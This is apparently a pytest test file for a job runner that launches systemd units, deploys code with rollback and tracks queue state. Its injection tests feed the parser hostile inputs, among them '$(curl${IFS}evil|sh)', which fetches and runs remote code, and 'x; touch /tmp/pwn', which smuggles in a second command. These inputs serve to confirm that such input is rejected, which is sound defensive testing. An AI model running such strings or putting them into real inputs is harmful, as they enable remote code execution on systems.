import json, types
from pathlib import Path
import pytest
from fxengine.ops import runner as R

sent = []


class Fake:
    """Scripted stand-in for runner.sh: records (cmd, as_user), returns canned (stdout, rc) by substring (first match wins)."""
    def __init__(self, replies=None):
        self.cmds, self.replies = [], dict(replies or {})

    def __call__(self, cmd, as_user=True, timeout=600):
        self.cmds.append((cmd, as_user))
        for k, v in self.replies.items():
            if k in cmd:
                out, rc = v if isinstance(v, tuple) else (v, 0)
                return types.SimpleNamespace(stdout=out, stderr="boom" if rc else "", returncode=rc)
        return types.SimpleNamespace(stdout="", stderr="", returncode=0)

    def ran(self, needle):
        return [c for c, _ in self.cmds if needle in c]


@pytest.fixture
def repo(tmp_path, monkeypatch):
    monkeypatch.setattr(R, "REPO", tmp_path)
    monkeypatch.setattr(R, "STATE", tmp_path / "data" / "ops_state.json")
    monkeypatch.setattr(R, "RESULTS_DIR", tmp_path.parent / "fx-results-test")
    monkeypatch.setattr(R, "notify", lambda t: sent.append(t))
    monkeypatch.setattr(R.time, "sleep", lambda s: None)
    monkeypatch.setattr(R, "USER", "owner")
    monkeypatch.setattr(R, "IS_ROOT", True)
    (tmp_path / "ops").mkdir()
    (tmp_path / "data").mkdir()
    sent.clear()
    return tmp_path


SAME = {"git rev-parse HEAD": "aaa", "git rev-parse origin/engine": "aaa"}


# ------------------------------------------------------------------ C1: no injection
def test_parse_jobs_rejects_hostile_ids_and_unknown_jobs():
    q, bad = R.parse_jobs("001 report\n$(curl${IFS}evil|sh) report\na;b report\n" + "x" * 40 + " report\n002 rm\n003 r0 # c\nbroken\n004 history\n")
    assert q == [("001", "report"), ("003", "r0"), ("004", "history")]
    assert len(bad) == 5


def test_start_job_quotes_everything_and_never_puts_ids_in_shell_text_unquoted(repo):
    fake = Fake()
    st = {"done": {}, "running": None}
    with pytest.raises(ValueError):
        R.start_job("x; touch /tmp/pwn", "report", st, fake)
    R.start_job("001", "history", st, fake)
    cmd = fake.cmds[-1][0]
    assert cmd.startswith("systemd-run --unit=fxjob-001 ") and "--uid=owner" in cmd and "--nice=19" in cmd
    assert "MemoryMax=450M" in cmd and "MemorySwapMax=1G" in cmd and "--collect" in cmd
    assert fake.cmds[-1][1] is False                           # root mode: the systemd-run call itself runs privileged
    assert st["running"]["unit"] == "fxjob-001"


def test_root_jobs_only_run_when_runner_is_root(repo, monkeypatch):
    fake = Fake()
    monkeypatch.setattr(R, "IS_ROOT", False)
    st = {"done": {}, "running": None}
    R.start_job("001", "harden", st, fake)
    assert st["running"] is None and st["done"]["001"]["rc"] == 126 and not fake.ran("systemd-run")
    monkeypatch.setattr(R, "IS_ROOT", True)
    st = {"done": {}, "running": None}
    R.start_job("002", "harden", st, fake)
    cmd = fake.ran("fxjob-002")[0]
    assert "--uid=" not in cmd and "MemoryMax" not in cmd      # maintenance runs as root, uncapped


def test_user_mode_uses_the_users_systemd_manager(repo, monkeypatch):
    monkeypatch.setattr(R, "IS_ROOT", False)
    monkeypatch.setattr(R.os, "getuid", lambda: 1000, raising=False)
    fake = Fake()
    st = {"done": {}, "running": None}
    R.start_job("001", "r0", st, fake)
    cmd, as_user = fake.cmds[-1]
    assert "XDG_RUNTIME_DIR=/run/user/1000" in cmd and "systemd-run --user" in cmd and "--uid" not in cmd and as_user is True


# ------------------------------------------------------------------ H1/H8/M2: unit tracking, kill, halt/resume
def test_job_lifecycle_by_unit_state_halt_resume_and_kill(repo):
    (repo / "ops" / "jobs.txt").write_text("001 report\n002 r0\n")
    state = {"active": "active\n"}

    class F(Fake):
        def __call__(self, cmd, as_user=True, timeout=600):
            if "is-active fxjob" in cmd:
                self.cmds.append((cmd, as_user))
                return types.SimpleNamespace(stdout=state["active"], stderr="", returncode=0)
            return super().__call__(cmd, as_user, timeout)
    fake = F(SAME)
    R.tick(fake)                                               # 001 starts
    out = R.tick(fake)                                         # unit still active -> nothing finalised
    assert out["finished"] is False and out["running"]["id"] == "001"
    state["active"] = "inactive\n"
    (repo / "data" / "ops_001.rc").write_text("1\n")           # it FAILED
    out = R.tick(fake)
    st = json.loads((repo / "data" / "ops_state.json").read_text())
    assert st["done"]["001"]["rc"] == 1 and st["halted"] is True and out["finished"] is True
    assert any("queue paused" in s for s in sent)
    n = len(fake.ran("systemd-run"))
    R.tick(fake)
    assert len(fake.ran("systemd-run")) == n                   # halted: 002 does not start
    (repo / "ops" / "control.txt").write_text("resume r1\n")
    R.tick(fake)
    assert len(fake.ran("systemd-run")) == n + 1               # resumed -> 002 starts
    state["active"] = "active\n"
    (repo / "ops" / "control.txt").write_text("resume r1\nkill 002\nkill 999\n")
    R.tick(fake)
    stops = fake.ran("systemctl stop fxjob-")
    assert len(stops) == 1 and "fxjob-002" in stops[0]         # kill = unit stop (kills the whole tree), only the matching job
    R.tick(fake)
    assert len(fake.ran("systemctl stop fxjob-")) == 1


def test_a_reboot_cannot_leave_a_phantom_running_job(repo):
    st = {"done": {}, "running": {"id": "007", "job": "r0", "unit": "fxjob-007", "start": 1.0}, "halted": False}
    R.save_state(st)
    (repo / "ops" / "jobs.txt").write_text("007 r0\n")
    fake = Fake({**SAME, "is-active fxjob": ("inactive\n", 3)})     # unit is gone after the reboot: no PID reuse possible
    out = R.tick(fake)
    st = json.loads((repo / "data" / "ops_state.json").read_text())
    assert out["finished"] and st["done"]["007"]["rc"] == -1 and st["halted"] is True


# ------------------------------------------------------------------ H2/H3/M1: deployment safety
def test_deploy_paths(repo):
    st = {"done": {}, "running": None}
    assert R.sync_code(st, Fake(SAME)) == "up-to-date"
    busy = {"done": {}, "running": {"id": "x"}}
    assert R.sync_code(busy, Fake({"git rev-parse HEAD": "a", "git rev-parse origin/engine": "b"})) == "busy"
    ok = Fake({"git rev-parse HEAD": "old", "git rev-parse origin/engine": "new", "git diff --name-only": "src/fxengine/x.py\n",
               "is-active fxengine": "active\nactive\n", "NRestarts": "0\n"})
    assert R.sync_code(st, ok) == "deployed" and ok.ran("systemctl restart")
    docs = Fake({"git rev-parse HEAD": "a", "git rev-parse origin/engine": "b", "git diff --name-only": "docs/x.md\n"})
    assert R.sync_code({"done": {}, "running": None}, docs) == "deployed" and not docs.ran("systemctl restart")


def test_bad_push_is_prechecked_rolled_back_once_and_never_loops(repo):
    sent.clear()
    st = {"done": {}, "running": None}
    pre = Fake({"git rev-parse HEAD": "old", "git rev-parse origin/engine": "new", "git archive": ("", 1)})
    assert R.sync_code(st, pre) == "precheck-failed" and not pre.ran("merge --ff-only") and not pre.ran("systemctl restart")
    assert R.sync_code(st, pre) == "skipped-known-bad" and len([s for s in sent if "does not import" in s]) == 1
    st = {"done": {}, "running": None}
    crash = Fake({"git rev-parse HEAD": "old", "git rev-parse origin/engine": "new", "git diff --name-only": "src/a.py\n",
                  "is-active fxengine": "active\nactive\n", "NRestarts": "3\n"})               # active but crash-looping
    assert R.sync_code(st, crash) == "rolled-back" and crash.ran("reset -q --hard old")
    n = len(crash.ran("systemctl restart"))
    assert R.sync_code(st, crash) == "skipped-known-bad" and len(crash.ran("systemctl restart")) == n     # no 2-minute loop
    assert len([s for s in sent if "Rolled back" in s]) == 1
    st = {"done": {}, "running": None}
    mf = Fake({"git rev-parse HEAD": "old", "git rev-parse origin/engine": "new2", "merge --ff-only": ("", 1)})
    assert R.sync_code(st, mf) == "merge-failed" and R.sync_code(st, mf) == "skipped-known-bad"


def test_vm_only_trial_registry_lines_survive_an_update(repo):
    f = repo / "docs"
    f.mkdir()
    (f / "trials.jsonl").write_text('{"name":"upstream1"}\n{"name":"vm_only"}\n')
    mine = R._tracked_trials()
    (f / "trials.jsonl").write_text('{"name":"upstream1"}\n')               # fast-forward replaced the file with upstream's
    R._restore_trials(mine)
    assert (f / "trials.jsonl").read_text().splitlines() == ['{"name":"upstream1"}', '{"name":"vm_only"}']


# ------------------------------------------------------------------ M3: push errors are surfaced once
def test_push_failure_is_reported_once(repo):
    st = {"done": {}, "running": None}
    fake = Fake({"git clone": ("", 1)})
    assert R.push_results(st, fake).startswith("clone-failed")
    R.push_results(st, fake)
    assert len([s for s in sent if "deploy key" in s]) == 1


def test_state_file_is_written_atomically(repo):
    R.save_state({"done": {"a": 1}, "running": None})
    assert R.load_state()["done"] == {"a": 1} and not (repo / "data" / "ops_state.tmp").exists()
    (repo / "data" / "ops_state.json").write_text("{broken")                   # corrupt file does not crash the runner
    assert R.load_state() == {"done": {}, "running": None}
